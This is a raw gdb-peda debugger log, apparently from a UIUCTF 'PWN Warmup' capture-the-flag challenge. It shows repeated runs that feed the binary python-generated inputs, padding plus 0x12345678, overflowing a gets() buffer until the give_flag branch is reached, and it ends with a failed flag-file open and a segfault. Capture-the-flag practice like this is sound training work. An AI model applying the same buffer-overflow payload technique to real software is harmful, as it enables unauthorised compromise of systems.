ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xf7fe42d0 (push   ebp)
ESP: 0xf7fb1d80 --> 0xfbad2887 
EIP: 0x0
EFLAGS: 0x10216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x0
[------------------------------------stack-------------------------------------]
0000| 0xf7fb1d80 --> 0xfbad2887 
0004| 0xf7fb1d84 --> 0xf7fb1dc7 --> 0xfb30100a 
0008| 0xf7fb1d88 --> 0xf7fb1dc7 --> 0xfb30100a 
0012| 0xf7fb1d8c --> 0xf7fb1dc7 --> 0xfb30100a 
0016| 0xf7fb1d90 --> 0xf7fb1dc7 --> 0xfb30100a 
0020| 0xf7fb1d94 --> 0xf7fb1dc7 --> 0xfb30100a 
0024| 0xf7fb1d98 --> 0xf7fb1dc7 --> 0xfb30100a 
0028| 0xf7fb1d9c --> 0xf7fb1dc7 --> 0xfb30100a 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000 in ?? ()
gdb-peda$ run <<< $(python -c "print 'A'*22+'\x78\x56\x34\x12'+'A'*6")
Starting program: /home/kali/uiuc/pwn-warmup <<< $(python -c "print 'A'*22+'\x78\x56\x34\x12'+'A'*6")
This is UIUCTF PWN Warmup, what could possibly be happening under here hmm...
[----------------------------------registers-----------------------------------]
EAX: 0xffffd308 ('A' <repeats 22 times>, "xV4\022AAAAAA")
EBX: 0x56556fb8 --> 0x1ec0 
ECX: 0xf7fb15c0 --> 0xfbad208b 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xffffd328 --> 0xffffd300 --> 0xf7fe42d0 (push   ebp)
ESP: 0xffffd300 --> 0xf7fe42d0 (push   ebp)
EIP: 0x56555752 (<vulnerable+48>:       cmp    DWORD PTR [ebp-0xc],0x12345678)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555748 <vulnerable+38>:  mov    ebx,eax
   0x5655574a <vulnerable+40>:  call   0x565554d0 <gets@plt>
   0x5655574f <vulnerable+45>:  add    esp,0x10
=> 0x56555752 <vulnerable+48>:  cmp    DWORD PTR [ebp-0xc],0x12345678
   0x56555759 <vulnerable+55>:  je     0x56555769 <vulnerable+71>
   0x5655575b <vulnerable+57>:  cmp    DWORD PTR [ebp-0x10],0x12345678
   0x56555762 <vulnerable+64>:  jne    0x56555769 <vulnerable+71>
   0x56555764 <vulnerable+66>:  call   0x5655569d <give_flag>
[------------------------------------stack-------------------------------------]
0000| 0xffffd300 --> 0xf7fe42d0 (push   ebp)
0004| 0xffffd304 --> 0xf7fb1000 --> 0x1d6d6c 
0008| 0xffffd308 ('A' <repeats 22 times>, "xV4\022AAAAAA")
0012| 0xffffd30c ('A' <repeats 18 times>, "xV4\022AAAAAA")
0016| 0xffffd310 ('A' <repeats 14 times>, "xV4\022AAAAAA")
0020| 0xffffd314 ("AAAAAAAAAAxV4\022AAAAAA")
0024| 0xffffd318 ("AAAAAAxV4\022AAAAAA")
0028| 0xffffd31c ("AAxV4\022AAAAAA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x56555752 in vulnerable ()
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd308 ('A' <repeats 22 times>, "xV4\022AAAAAA")
EBX: 0x56556fb8 --> 0x1ec0 
ECX: 0xf7fb15c0 --> 0xfbad208b 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xffffd328 --> 0xffffd300 --> 0xf7fe42d0 (push   ebp)
ESP: 0xffffd300 --> 0xf7fe42d0 (push   ebp)
EIP: 0x5655575b (<vulnerable+57>:       cmp    DWORD PTR [ebp-0x10],0x12345678)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5655574f <vulnerable+45>:  add    esp,0x10
   0x56555752 <vulnerable+48>:  cmp    DWORD PTR [ebp-0xc],0x12345678
   0x56555759 <vulnerable+55>:  je     0x56555769 <vulnerable+71>
=> 0x5655575b <vulnerable+57>:  cmp    DWORD PTR [ebp-0x10],0x12345678
   0x56555762 <vulnerable+64>:  jne    0x56555769 <vulnerable+71>
   0x56555764 <vulnerable+66>:  call   0x5655569d <give_flag>
   0x56555769 <vulnerable+71>:  nop
   0x5655576a <vulnerable+72>:  mov    ebx,DWORD PTR [ebp-0x4]
[------------------------------------stack-------------------------------------]
0000| 0xffffd300 --> 0xf7fe42d0 (push   ebp)
0004| 0xffffd304 --> 0xf7fb1000 --> 0x1d6d6c 
0008| 0xffffd308 ('A' <repeats 22 times>, "xV4\022AAAAAA")
0012| 0xffffd30c ('A' <repeats 18 times>, "xV4\022AAAAAA")
0016| 0xffffd310 ('A' <repeats 14 times>, "xV4\022AAAAAA")
0020| 0xffffd314 ("AAAAAAAAAAxV4\022AAAAAA")
0024| 0xffffd318 ("AAAAAAxV4\022AAAAAA")
0028| 0xffffd31c ("AAxV4\022AAAAAA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x5655575b in vulnerable ()
gdb-peda$ x/100x $ebp-0x10
0xffffd318:     0x41    0x41    0x41    0x41    0x41    0x41    0x78    0x56
0xffffd320:     0x34    0x12    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd328:     0x00    0xd3    0xff    0xff    0xce    0x57    0x55    0x56
0xffffd330:     0x50    0xd3    0xff    0xff    0x00    0x00    0x00    0x00
0xffffd338:     0x00    0x00    0x00    0x00    0x11    0x88    0xdf    0xf7
0xffffd340:     0x00    0x10    0xfb    0xf7    0x00    0x10    0xfb    0xf7
0xffffd348:     0x00    0x00    0x00    0x00    0x11    0x88    0xdf    0xf7
0xffffd350:     0x01    0x00    0x00    0x00    0xe4    0xd3    0xff    0xff
0xffffd358:     0xec    0xd3    0xff    0xff    0x74    0xd3    0xff    0xff
0xffffd360:     0x6c    0x4a    0xfd    0xf7    0x00    0xd0    0xff    0xf7
0xffffd368:     0x00    0x10    0xfb    0xf7    0x00    0x00    0x00    0x00
0xffffd370:     0x50    0xd9    0xff    0xf7    0x00    0x00    0x00    0x00
0xffffd378:     0x00    0x10    0xfb    0xf7
gdb-peda$ run <<< $(python -c "print 'A'*17+'\x78\x56\x34\x12'+'A'*11")
Starting program: /home/kali/uiuc/pwn-warmup <<< $(python -c "print 'A'*17+'\x78\x56\x34\x12'+'A'*11")
This is UIUCTF PWN Warmup, what could possibly be happening under here hmm...
[----------------------------------registers-----------------------------------]
EAX: 0xffffd308 ('A' <repeats 17 times>, "xV4\022", 'A' <repeats 11 times>)
EBX: 0x56556fb8 --> 0x1ec0 
ECX: 0xf7fb15c0 --> 0xfbad208b 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xffffd328 --> 0xffffd300 --> 0xf7fe42d0 (push   ebp)
ESP: 0xffffd300 --> 0xf7fe42d0 (push   ebp)
EIP: 0x56555752 (<vulnerable+48>:       cmp    DWORD PTR [ebp-0xc],0x12345678)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555748 <vulnerable+38>:  mov    ebx,eax
   0x5655574a <vulnerable+40>:  call   0x565554d0 <gets@plt>
   0x5655574f <vulnerable+45>:  add    esp,0x10
=> 0x56555752 <vulnerable+48>:  cmp    DWORD PTR [ebp-0xc],0x12345678
   0x56555759 <vulnerable+55>:  je     0x56555769 <vulnerable+71>
   0x5655575b <vulnerable+57>:  cmp    DWORD PTR [ebp-0x10],0x12345678
   0x56555762 <vulnerable+64>:  jne    0x56555769 <vulnerable+71>
   0x56555764 <vulnerable+66>:  call   0x5655569d <give_flag>
[------------------------------------stack-------------------------------------]
0000| 0xffffd300 --> 0xf7fe42d0 (push   ebp)
0004| 0xffffd304 --> 0xf7fb1000 --> 0x1d6d6c 
0008| 0xffffd308 ('A' <repeats 17 times>, "xV4\022", 'A' <repeats 11 times>)
0012| 0xffffd30c ('A' <repeats 13 times>, "xV4\022", 'A' <repeats 11 times>)
0016| 0xffffd310 ("AAAAAAAAAxV4\022", 'A' <repeats 11 times>)
0020| 0xffffd314 ("AAAAAxV4\022", 'A' <repeats 11 times>)
0024| 0xffffd318 ("AxV4\022", 'A' <repeats 11 times>)
0028| 0xffffd31c --> 0x41414112 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x56555752 in vulnerable ()
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd308 ('A' <repeats 17 times>, "xV4\022", 'A' <repeats 11 times>)
EBX: 0x56556fb8 --> 0x1ec0 
ECX: 0xf7fb15c0 --> 0xfbad208b 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xffffd328 --> 0xffffd300 --> 0xf7fe42d0 (push   ebp)
ESP: 0xffffd300 --> 0xf7fe42d0 (push   ebp)
EIP: 0x5655575b (<vulnerable+57>:       cmp    DWORD PTR [ebp-0x10],0x12345678)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5655574f <vulnerable+45>:  add    esp,0x10
   0x56555752 <vulnerable+48>:  cmp    DWORD PTR [ebp-0xc],0x12345678
   0x56555759 <vulnerable+55>:  je     0x56555769 <vulnerable+71>
=> 0x5655575b <vulnerable+57>:  cmp    DWORD PTR [ebp-0x10],0x12345678
   0x56555762 <vulnerable+64>:  jne    0x56555769 <vulnerable+71>
   0x56555764 <vulnerable+66>:  call   0x5655569d <give_flag>
   0x56555769 <vulnerable+71>:  nop
   0x5655576a <vulnerable+72>:  mov    ebx,DWORD PTR [ebp-0x4]
[------------------------------------stack-------------------------------------]
0000| 0xffffd300 --> 0xf7fe42d0 (push   ebp)
0004| 0xffffd304 --> 0xf7fb1000 --> 0x1d6d6c 
0008| 0xffffd308 ('A' <repeats 17 times>, "xV4\022", 'A' <repeats 11 times>)
0012| 0xffffd30c ('A' <repeats 13 times>, "xV4\022", 'A' <repeats 11 times>)
0016| 0xffffd310 ("AAAAAAAAAxV4\022", 'A' <repeats 11 times>)
0020| 0xffffd314 ("AAAAAxV4\022", 'A' <repeats 11 times>)
0024| 0xffffd318 ("AxV4\022", 'A' <repeats 11 times>)
0028| 0xffffd31c --> 0x41414112 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x5655575b in vulnerable ()
gdb-peda$ c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x5655572e (<vulnerable+12>:       add    eax,0x188a)
ECX: 0xf7fb1d80 --> 0xfbad2887 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xf7fe42d0 (push   ebp)
ESP: 0xf7fb1d80 --> 0xfbad2887 
EIP: 0x0
EFLAGS: 0x10216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x0
[------------------------------------stack-------------------------------------]
0000| 0xf7fb1d80 --> 0xfbad2887 
0004| 0xf7fb1d84 --> 0xf7fb1dc7 --> 0xfb30100a 
0008| 0xf7fb1d88 --> 0xf7fb1dc7 --> 0xfb30100a 
0012| 0xf7fb1d8c --> 0xf7fb1dc7 --> 0xfb30100a 
0016| 0xf7fb1d90 --> 0xf7fb1dc7 --> 0xfb30100a 
0020| 0xf7fb1d94 --> 0xf7fb1dc7 --> 0xfb30100a 
0024| 0xf7fb1d98 --> 0xf7fb1dc7 --> 0xfb30100a 
0028| 0xf7fb1d9c --> 0xf7fb1dc7 --> 0xfb30100a 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000 in ?? ()
gdb-peda$ run <<< $(python -c "print 'A'*17+'\x78\x56\x34\x12'+'A'*11")
Starting program: /home/kali/uiuc/pwn-warmup <<< $(python -c "print 'A'*17+'\x78\x56\x34\x12'+'A'*11")
This is UIUCTF PWN Warmup, what could possibly be happening under here hmm...
[----------------------------------registers-----------------------------------]
EAX: 0xffffd308 ('A' <repeats 17 times>, "xV4\022", 'A' <repeats 11 times>)
EBX: 0x56556fb8 --> 0x1ec0 
ECX: 0xf7fb15c0 --> 0xfbad208b 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xffffd328 --> 0xffffd300 --> 0xf7fe42d0 (push   ebp)
ESP: 0xffffd300 --> 0xf7fe42d0 (push   ebp)
EIP: 0x56555752 (<vulnerable+48>:       cmp    DWORD PTR [ebp-0xc],0x12345678)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555748 <vulnerable+38>:  mov    ebx,eax
   0x5655574a <vulnerable+40>:  call   0x565554d0 <gets@plt>
   0x5655574f <vulnerable+45>:  add    esp,0x10
=> 0x56555752 <vulnerable+48>:  cmp    DWORD PTR [ebp-0xc],0x12345678
   0x56555759 <vulnerable+55>:  je     0x56555769 <vulnerable+71>
   0x5655575b <vulnerable+57>:  cmp    DWORD PTR [ebp-0x10],0x12345678
   0x56555762 <vulnerable+64>:  jne    0x56555769 <vulnerable+71>
   0x56555764 <vulnerable+66>:  call   0x5655569d <give_flag>
[------------------------------------stack-------------------------------------]
0000| 0xffffd300 --> 0xf7fe42d0 (push   ebp)
0004| 0xffffd304 --> 0xf7fb1000 --> 0x1d6d6c 
0008| 0xffffd308 ('A' <repeats 17 times>, "xV4\022", 'A' <repeats 11 times>)
0012| 0xffffd30c ('A' <repeats 13 times>, "xV4\022", 'A' <repeats 11 times>)
0016| 0xffffd310 ("AAAAAAAAAxV4\022", 'A' <repeats 11 times>)
0020| 0xffffd314 ("AAAAAxV4\022", 'A' <repeats 11 times>)
0024| 0xffffd318 ("AxV4\022", 'A' <repeats 11 times>)
0028| 0xffffd31c --> 0x41414112 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x56555752 in vulnerable ()
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd308 ('A' <repeats 17 times>, "xV4\022", 'A' <repeats 11 times>)
EBX: 0x56556fb8 --> 0x1ec0 
ECX: 0xf7fb15c0 --> 0xfbad208b 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xffffd328 --> 0xffffd300 --> 0xf7fe42d0 (push   ebp)
ESP: 0xffffd300 --> 0xf7fe42d0 (push   ebp)
EIP: 0x5655575b (<vulnerable+57>:       cmp    DWORD PTR [ebp-0x10],0x12345678)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5655574f <vulnerable+45>:  add    esp,0x10
   0x56555752 <vulnerable+48>:  cmp    DWORD PTR [ebp-0xc],0x12345678
   0x56555759 <vulnerable+55>:  je     0x56555769 <vulnerable+71>
=> 0x5655575b <vulnerable+57>:  cmp    DWORD PTR [ebp-0x10],0x12345678
   0x56555762 <vulnerable+64>:  jne    0x56555769 <vulnerable+71>
   0x56555764 <vulnerable+66>:  call   0x5655569d <give_flag>
   0x56555769 <vulnerable+71>:  nop
   0x5655576a <vulnerable+72>:  mov    ebx,DWORD PTR [ebp-0x4]
[------------------------------------stack-------------------------------------]
0000| 0xffffd300 --> 0xf7fe42d0 (push   ebp)
0004| 0xffffd304 --> 0xf7fb1000 --> 0x1d6d6c 
0008| 0xffffd308 ('A' <repeats 17 times>, "xV4\022", 'A' <repeats 11 times>)
0012| 0xffffd30c ('A' <repeats 13 times>, "xV4\022", 'A' <repeats 11 times>)
0016| 0xffffd310 ("AAAAAAAAAxV4\022", 'A' <repeats 11 times>)
0020| 0xffffd314 ("AAAAAxV4\022", 'A' <repeats 11 times>)
0024| 0xffffd318 ("AxV4\022", 'A' <repeats 11 times>)
0028| 0xffffd31c --> 0x41414112 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x5655575b in vulnerable ()
gdb-peda$ x/100x $ebp-0x10
0xffffd318:     0x34567841      0x41414112      0x41414141      0x41414141
0xffffd328:     0xffffd300      0x565557ce      0xffffd350      0x00000000
0xffffd338:     0x00000000      0xf7df8811      0xf7fb1000      0xf7fb1000
0xffffd348:     0x00000000      0xf7df8811      0x00000001      0xffffd3e4
0xffffd358:     0xffffd3ec      0xffffd374      0xf7fd4a6c      0xf7ffd000
0xffffd368:     0xf7fb1000      0x00000000      0xf7ffd950      0x00000000
0xffffd378:     0xf7fb1000      0xf7fb1000      0x00000000      0x22eca6ab
0xffffd388:     0x6245a0bb      0x00000000      0x00000000      0x00000000
0xffffd398:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd3a8:     0xf7fe4179      0x56556fb8      0x00000001      0x56555560
0xffffd3b8:     0x00000000      0x56555591      0x5655576f      0x00000001
0xffffd3c8:     0xffffd3e4      0x565557f0      0x56555850      0xf7fe42d0
0xffffd3d8:     0xffffd3dc      0x0000001c      0x00000001      0xffffd56b
0xffffd3e8:     0x00000000      0xffffd586      0xffffd596      0xffffd5e2
0xffffd3f8:     0xffffd5ed      0xffffd600      0xffffd619      0xffffd653
0xffffd408:     0xffffd669      0xffffd673      0xffffd6a1      0xffffd6c2
0xffffd418:     0xffffd6d5      0xffffd6e4      0xffffd6f8      0xffffd705
0xffffd428:     0xffffd72a      0xffffd744      0xffffd759      0xffffd768
0xffffd438:     0xffffd78a      0xffffd7ba      0xffffd7c3      0xffffd7d3
0xffffd448:     0xffffd7e3      0xffffddc5      0xffffddde      0xffffddea
0xffffd458:     0xffffde1e      0xffffde35      0xffffde49      0xffffde53
0xffffd468:     0xffffde62      0xffffde6d      0xffffde75      0xffffde80
0xffffd478:     0xffffde91      0xffffdeb0      0xffffdef8      0xffffdf36
0xffffd488:     0xffffdf52      0xffffdf88      0xffffdfcb      0x00000000
0xffffd498:     0x00000020      0xf7fd3b50      0x00000021      0xf7fd3000
gdb-peda$ run <<< $(python -c "print 'A'*16+'\x78\x56\x34\x12'+'A'*12")
Starting program: /home/kali/uiuc/pwn-warmup <<< $(python -c "print 'A'*16+'\x78\x56\x34\x12'+'A'*12")
This is UIUCTF PWN Warmup, what could possibly be happening under here hmm...
[----------------------------------registers-----------------------------------]
EAX: 0xffffd308 ('A' <repeats 16 times>, "xV4\022", 'A' <repeats 12 times>)
EBX: 0x56556fb8 --> 0x1ec0 
ECX: 0xf7fb15c0 --> 0xfbad208b 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xffffd328 --> 0xffffd300 --> 0xf7fe42d0 (push   ebp)
ESP: 0xffffd300 --> 0xf7fe42d0 (push   ebp)
EIP: 0x56555752 (<vulnerable+48>:       cmp    DWORD PTR [ebp-0xc],0x12345678)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555748 <vulnerable+38>:  mov    ebx,eax
   0x5655574a <vulnerable+40>:  call   0x565554d0 <gets@plt>
   0x5655574f <vulnerable+45>:  add    esp,0x10
=> 0x56555752 <vulnerable+48>:  cmp    DWORD PTR [ebp-0xc],0x12345678
   0x56555759 <vulnerable+55>:  je     0x56555769 <vulnerable+71>
   0x5655575b <vulnerable+57>:  cmp    DWORD PTR [ebp-0x10],0x12345678
   0x56555762 <vulnerable+64>:  jne    0x56555769 <vulnerable+71>
   0x56555764 <vulnerable+66>:  call   0x5655569d <give_flag>
[------------------------------------stack-------------------------------------]
0000| 0xffffd300 --> 0xf7fe42d0 (push   ebp)
0004| 0xffffd304 --> 0xf7fb1000 --> 0x1d6d6c 
0008| 0xffffd308 ('A' <repeats 16 times>, "xV4\022", 'A' <repeats 12 times>)
0012| 0xffffd30c ('A' <repeats 12 times>, "xV4\022", 'A' <repeats 12 times>)
0016| 0xffffd310 ("AAAAAAAAxV4\022", 'A' <repeats 12 times>)
0020| 0xffffd314 ("AAAAxV4\022", 'A' <repeats 12 times>)
0024| 0xffffd318 --> 0x12345678 
0028| 0xffffd31c ('A' <repeats 12 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x56555752 in vulnerable ()
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd308 ('A' <repeats 16 times>, "xV4\022", 'A' <repeats 12 times>)
EBX: 0x56556fb8 --> 0x1ec0 
ECX: 0xf7fb15c0 --> 0xfbad208b 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xffffd328 --> 0xffffd300 --> 0xf7fe42d0 (push   ebp)
ESP: 0xffffd300 --> 0xf7fe42d0 (push   ebp)
EIP: 0x5655575b (<vulnerable+57>:       cmp    DWORD PTR [ebp-0x10],0x12345678)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5655574f <vulnerable+45>:  add    esp,0x10
   0x56555752 <vulnerable+48>:  cmp    DWORD PTR [ebp-0xc],0x12345678
   0x56555759 <vulnerable+55>:  je     0x56555769 <vulnerable+71>
=> 0x5655575b <vulnerable+57>:  cmp    DWORD PTR [ebp-0x10],0x12345678
   0x56555762 <vulnerable+64>:  jne    0x56555769 <vulnerable+71>
   0x56555764 <vulnerable+66>:  call   0x5655569d <give_flag>
   0x56555769 <vulnerable+71>:  nop
   0x5655576a <vulnerable+72>:  mov    ebx,DWORD PTR [ebp-0x4]
[------------------------------------stack-------------------------------------]
0000| 0xffffd300 --> 0xf7fe42d0 (push   ebp)
0004| 0xffffd304 --> 0xf7fb1000 --> 0x1d6d6c 
0008| 0xffffd308 ('A' <repeats 16 times>, "xV4\022", 'A' <repeats 12 times>)
0012| 0xffffd30c ('A' <repeats 12 times>, "xV4\022", 'A' <repeats 12 times>)
0016| 0xffffd310 ("AAAAAAAAxV4\022", 'A' <repeats 12 times>)
0020| 0xffffd314 ("AAAAxV4\022", 'A' <repeats 12 times>)
0024| 0xffffd318 --> 0x12345678 
0028| 0xffffd31c ('A' <repeats 12 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x5655575b in vulnerable ()
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd308 ('A' <repeats 16 times>, "xV4\022", 'A' <repeats 12 times>)
EBX: 0x56556fb8 --> 0x1ec0 
ECX: 0xf7fb15c0 --> 0xfbad208b 
EDX: 0xf7fb301c --> 0x0 
ESI: 0xf7fb1000 --> 0x1d6d6c 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xffffd328 --> 0xffffd300 --> 0xf7fe42d0 (push   ebp)
ESP: 0xffffd300 --> 0xf7fe42d0 (push   ebp)
EIP: 0x56555764 (<vulnerable+66>:       call   0x5655569d <give_flag>)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555759 <vulnerable+55>:  je     0x56555769 <vulnerable+71>
   0x5655575b <vulnerable+57>:  cmp    DWORD PTR [ebp-0x10],0x12345678
   0x56555762 <vulnerable+64>:  jne    0x56555769 <vulnerable+71>
=> 0x56555764 <vulnerable+66>:  call   0x5655569d <give_flag>
   0x56555769 <vulnerable+71>:  nop
   0x5655576a <vulnerable+72>:  mov    ebx,DWORD PTR [ebp-0x4]
   0x5655576d <vulnerable+75>:  leave  
   0x5655576e <vulnerable+76>:  ret
No argument
[------------------------------------stack-------------------------------------]
0000| 0xffffd300 --> 0xf7fe42d0 (push   ebp)
0004| 0xffffd304 --> 0xf7fb1000 --> 0x1d6d6c 
0008| 0xffffd308 ('A' <repeats 16 times>, "xV4\022", 'A' <repeats 12 times>)
0012| 0xffffd30c ('A' <repeats 12 times>, "xV4\022", 'A' <repeats 12 times>)
0016| 0xffffd310 ("AAAAAAAAxV4\022", 'A' <repeats 12 times>)
0020| 0xffffd314 ("AAAAxV4\022", 'A' <repeats 12 times>)
0024| 0xffffd318 --> 0x12345678 
0028| 0xffffd31c ('A' <repeats 12 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 3, 0x56555764 in vulnerable ()
gdb-peda$ c
Continuing.
Couldn't open flag file!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x19 
EBX: 0x56556fb8 --> 0x1ec0 
ECX: 0xf7fb3010 --> 0x0 
EDX: 0x19 
ESI: 0x0 
EDI: 0xf7fb1000 --> 0x1d6d6c 
EBP: 0xffffd2c8 --> 0xffffd2f8 --> 0xffffd328 --> 0xffffd300 --> 0xf7fe42d0 (push   ebp)
ESP: 0xffffd2a0 --> 0x56556fb8 --> 0x1ec0 
EIP: 0xf7e441d7 (<fclose+23>:   cmp    BYTE PTR [esi+0x46],0x0)
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7e441d0 <fclose+16>:      push   ebx
   0xf7e441d1 <fclose+17>:      sub    esp,0x1c
   0xf7e441d4 <fclose+20>:      mov    esi,DWORD PTR [ebp+0x8]
=> 0xf7e441d7 <fclose+23>:      cmp    BYTE PTR [esi+0x46],0x0
   0xf7e441db <fclose+27>:      jne    0xf7e443b8 <fclose+504>
   0xf7e441e1 <fclose+33>:      mov    eax,DWORD PTR [esi]
   0xf7e441e3 <fclose+35>:      test   ah,0x20
   0xf7e441e6 <fclose+38>:      jne    0xf7e44398 <fclose+472>
[------------------------------------stack-------------------------------------]
0000| 0xffffd2a0 --> 0x56556fb8 --> 0x1ec0 
0004| 0xffffd2a4 --> 0xf7fb1e1c --> 0xf7fb1d80 --> 0xfbad2887 
0008| 0xffffd2a8 --> 0xf7fb1d80 --> 0xfbad2887 
0012| 0xffffd2ac --> 0x18 
0016| 0xffffd2b0 ("rXUVpXUV\001")
0020| 0xffffd2b4 ("pXUV\001")
0024| 0xffffd2b8 --> 0x1 
0028| 0xffffd2bc --> 0x56556fb8 --> 0x1ec0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0xf7e441d7 in fclose () from /lib32/libc.so.6

```